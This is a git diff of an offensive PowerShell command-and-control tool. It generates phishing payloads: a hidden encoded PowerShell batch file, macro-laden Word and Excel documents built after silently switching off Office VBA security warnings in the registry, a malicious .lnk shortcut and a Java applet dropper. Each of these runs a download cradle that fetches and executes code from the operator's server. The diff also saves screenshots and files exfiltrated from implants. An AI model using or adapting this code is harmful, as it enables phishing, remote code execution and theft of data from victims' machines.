@@ -242,9 +242,9 @@ function CreatePayload
     $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
     $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
     $payload = $payloadraw -replace "`n", ""
-    [IO.File]::WriteAllLines("$global:newdir\payload.bat", $payload)
+    [IO.File]::WriteAllLines("$global:newdir\payloads\payload.bat", $payload)
 
-    Write-Host -Object "Batch Payload written to: $global:newdir\payload.bat"  -ForegroundColor Green
+    Write-Host -Object "Batch Payload written to: $global:newdir\payloads\payload.bat"  -ForegroundColor Green
 }
 
 # create exe 
@@ -337,13 +337,13 @@ public class Sample : System.Configuration.Install.Installer
         return stringBuilder.ToString().Trim();
     }
 }'
-[IO.File]::WriteAllLines("$global:newdir\posh.cs", $csccode)
+[IO.File]::WriteAllLines("$global:newdir\payloads\posh.cs", $csccode)
 
 if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
-    Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\posh.exe $global:newdir\posh.cs /reference:C:\Temp\PowershellC2\System.Management.Automation.dll"
+    Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:C:\Temp\PowershellC2\System.Management.Automation.dll"
 } else {
     if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
-        Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\posh.exe $global:newdir\posh.cs /reference:C:\Temp\PowershellC2\System.Management.Automation.dll"
+        Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:C:\Temp\PowershellC2\System.Management.Automation.dll"
     }
 }
 
@@ -388,7 +388,7 @@ UpdateMacro
 End Sub
 
 Sub UpdateMacro()
-Dim str, exec 
+Dim str, exec, wsh
 
 str = ""
 '+$payloadbits+'
@@ -407,17 +407,65 @@ exec = exec + "e"
 exec = exec + "x"
 exec = exec + "e"
 exec = exec + " -exec bypass -Noninteractive -windowstyle hidden -e " & str
+'
 
+$macrodoc = $macro + '
 Shell(exec)
-
 End Sub'
 
-    [IO.File]::WriteAllLines("$global:newdir\macro.txt", $macro)
-    $wscript = $macro + "`nUpdateMacro"
-    [IO.File]::WriteAllLines("$global:newdir\wscript.vbs", $wscript)
+$wscript = $macro + '
+Set wsh = CreateObject( "WScript.Shell" )
+wsh.Exec(exec)
+End Sub
 
-    Write-Host -Object "Macro Payload written to: $global:newdir\macro.txt"  -ForegroundColor Green
-    Write-Host -Object "Wscript Payload written to: $global:newdir\wscript.vbs"  -ForegroundColor Green
+UpdateMacro'
+
+    [IO.File]::WriteAllLines("$global:newdir\payloads\macro.txt", $macrodoc)
+    [IO.File]::WriteAllLines("$global:newdir\payloads\wscript.vbs", $wscript)
+
+    Write-Host -Object "Macro Payload written to: $global:newdir\payloads\macro.txt"  -ForegroundColor Green
+    Write-Host -Object "Wscript Payload written to: $global:newdir\payloads\wscript.vbs"  -ForegroundColor Green
+
+    Add-Type -AssemblyName Microsoft.Office.Interop.Excel
+    $ExcelApp = New-Object -ComObject "Excel.Application"
+    $ExcelVersion = $ExcelApp.Version
+
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
+
+    $ExcelApp.DisplayAlerts = $false
+    $ExcelApp.DisplayAlerts = "wdAlertsNone"
+    $ExcelApp.Visible = $false
+    $ExcelWorkbook = $ExcelApp.Workbooks.Add(1)
+    $ExcelWorksheet = $ExcelWorkbook.Worksheets.Item(1)
+    $ExcelVBA = $ExcelWorkbook.VBProject.VBComponents.Add(1)
+    $ExcelVBA.CodeModule.AddFromString($macrodoc)
+    $ExcelWorkbook.SaveAs("$global:newdir\payloads\ExcelMacro", [Microsoft.Office.Interop.Excel.XLFileFormat]::xlExcel8)
+    Write-Host -Object "Weaponised Microsoft Excel Document written to: $global:newdir\payloads\ExcelMacro.xls"  -ForegroundColor Green
+    $ExcelApp.Workbooks.Close()
+    $ExcelApp.Quit()
+
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM | Out-Null
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings | Out-Null
+
+    Add-Type -AssemblyName Microsoft.Office.Interop.Word
+    $WordApp = New-Object -ComObject "Word.Application"
+    $WordVersion = $WordApp.Version
+    
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
+    
+    $WordApp.Visible = $false
+    $WordPage = $WordApp.Documents.Add()
+    $WordVBA = $WordPage.VBProject.VBComponents.Add(1)
+    $WordVBA.CodeModule.AddFromString($macrodoc)
+    $WordPage.SaveAs("$global:newdir\payloads\WordMacro", [Microsoft.Office.Interop.Word.Application]::xlWord8)
+    Write-Host -Object "Weaponised Microsoft Word Document written to: $global:newdir\payloads\WordMacro.doc"  -ForegroundColor Green
+    $WordApp.Quit()
+    
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM | Out-Null
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings | Out-Null
+
 }
 
 # taken from nishang Out-Java
@@ -475,7 +523,7 @@ Out-File -InputObject $Manifest -Encoding ascii -FilePath $ManifestFile
 
 # create the JAR
 $Jarpath = "$JDKPath" + "\bin\jar.exe"
-& "$JarPath" "-cvfm" "$global:newdir\JavaPS.jar" "$ManifestFile" "JavaPS.class"|out-null
+& "$JarPath" "-cvfm" "$global:newdir\payloads\JavaPS.jar" "$ManifestFile" "JavaPS.class"|out-null
    
 # output simple html. This could be used with any cloned web page.
 # host this HTML and SignedJarPS.jar on a web server.
@@ -485,7 +533,7 @@ $HTMLCode = @'
 </object></div>
 <applet code="JavaPS" width="1" height="1" archive="JavaPS.jar" > </applet>'
 '@
-$HTMLFile = "$global:newdir\applet.html"
+$HTMLFile = "$global:newdir\payloads\applet.html"
 Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile   
 
 # cleanup
@@ -500,7 +548,7 @@ Write-Host -Object "Java Payload written to: $global:newdir\JavaPS.jar and apple
 if ($args[0]) 
 {
     $global:newdir = $args[0]
-    $payload = Get-Content "$global:newdir\payload.bat"
+    $payload = Get-Content "$global:newdir\payloads\payload.bat"
     Write-Host -Object "Using existing database and payloads: $global:newdir"
     $Database = "$global:newdir\PowershellC2.SQLite"
     $taskscompleted = Invoke-SqliteQuery -DataSource $Database -Query "SELECT CompletedTaskID FROM CompletedTasks" -As SingleValue
@@ -585,6 +633,9 @@ else
     $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('http://$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
 
     New-Item $global:newdir -Type directory | Out-Null
+    New-Item $global:newdir\downloads -Type directory | Out-Null
+    New-Item $global:newdir\reports -Type directory | Out-Null
+    New-Item $global:newdir\payloads -Type directory | Out-Null
     $Database = "$global:newdir\PowershellC2.SQLite"
 
     $Query = 'CREATE TABLE Implants (
@@ -698,7 +749,7 @@ primer | iex }'
     CreatePayload
     CreateMacroPayload
     CreateStandAloneExe
-    Write-Host -Object "Phishing .lnk Payload written to: $global:newdir\PhishingAttack-Link.lnk"  -ForegroundColor Green
+    Write-Host -Object "Phishing .lnk Payload written to: $global:newdir\payloads\PhishingAttack-Link.lnk"  -ForegroundColor Green
 
     $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
     $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
@@ -729,7 +780,7 @@ primer | iex }'
 
     $SourceExe = "powershell.exe"
     $ArgumentsToSourceExe = "-exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('http://$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
-    $DestinationPath = "$global:newdir\PhisingAttack-Link.lnk"
+    $DestinationPath = "$global:newdir\payloads\PhisingAttack-Link.lnk"
     $WshShell = New-Object -comObject WScript.Shell
     $Shortcut = $WshShell.CreateShortcut($DestinationPath)
     $Shortcut.TargetPath = $SourceExe
@@ -1127,7 +1178,7 @@ $message =[Convert]::ToBase64String($Bytes)
                 Add-Type -AssemblyName System.Drawing
                 try{
                 $randomimageid = Get-RandomURI -Length 15
-                $imagepath = "$global:newdir\$randomimageid.png"
+                $imagepath = "$global:newdir\downloads\$randomimageid.png"
                 #Convert Base64 to Image
                 $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''
                 $imageBytes = [Convert]::FromBase64String($backToPlainText)
@@ -1135,13 +1186,13 @@ $message =[Convert]::ToBase64String($Bytes)
                 $ms.Write($imageBytes, 0, $imageBytes.Length)
                 $image = [System.Drawing.Image]::FromStream($ms, $true)
                 $image.Save("$imagepath")
-                $backToPlainText = "Captured Screenshot: $global:newdir\$randomimageid.png 123456<>654321"
+                $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
                 }
                 catch {
                 $backToPlainText = "Screenshot not captured, the screen could be locked or this user does not have access to the screen!"
                 Write-Host "Screenshot not captured, the screen could be locked or this user does not have access to the screen!" -ForegroundColor Red
                 }
-                $backToPlainText = "Captured Screenshot: $global:newdir\$randomimageid.png 123456<>654321"
+                $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
             }
             # if the task was to downloa a file, dump it directly to disk
             if  ($cookieplaintext.tolower().startswith('download-file'))
@@ -1151,7 +1202,7 @@ $message =[Convert]::ToBase64String($Bytes)
                 $file = $file -replace "'", ""
                 $file = $file.split('\.')[-1]
                 $ramdomfileext = Get-RandomURI -Length 15
-                $targetfile = "$global:newdir\$ramdomfileext.$file"   
+                $targetfile = "$global:newdir\downloads\$ramdomfileext.$file"   
                 $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''        
                 $fileBytes = [Convert]::FromBase64String($backToPlainText)
                 [io.file]::WriteAllBytes($targetfile, $fileBytes)
